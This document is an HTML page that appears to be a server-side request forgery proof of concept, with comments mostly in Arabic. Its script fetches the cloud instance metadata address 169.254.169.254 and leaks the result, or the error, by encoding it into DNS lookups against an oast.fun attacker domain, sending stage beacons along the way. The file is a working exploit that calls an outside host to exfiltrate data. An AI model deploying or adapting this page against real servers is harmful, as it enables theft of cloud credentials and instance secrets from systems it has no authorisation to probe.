<!DOCTYPE html>
<html>
<head>
    <title>SSRF PoC - Final DNS Exfil</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
        // استخدم نطاق interactsh الجديد الخاص بك هنا
        const ATTACKER_DOMAIN = "nhuxvcmuoqyycrcxbetorlulfeg7opf2m.oast.fun";

        function exfiltrate(data) {
            // تنظيف البيانات لجعلها صالحة كجزء من اسم النطاق
            let subdomain = data.replace(/[^a-zA-Z0-9-]/g, '.').substring(0, 60);
            // إنشاء طلب fetch لت déclencher استعلام DNS
            fetch("http://" + subdomain + "." + ATTACKER_DOMAIN, { mode: 'no-cors' });
        }

        exfiltrate("Stage1-Code-Loaded-By-Server");

        setTimeout(() => {
            exfiltrate("Stage2-Attempting-Internal-Fetch");
            fetch('http://169.254.169.254/latest/meta-data/')
                .then(response => response.text())
                .then(data => {
                    // إذا نجح، قم بتسريب البيانات المسروقة
                    exfiltrate("Stage3-SUCCESS-" + data);
                })
                .catch(error => {
                    // إذا فشل، قم بتسريب رسالة الخطأ
                    exfiltrate("Stage4-FAILED-" + error.toString());
                });
        }, 7000); // انتظر 7 ثوانٍ
    </script>
</body>
</html>
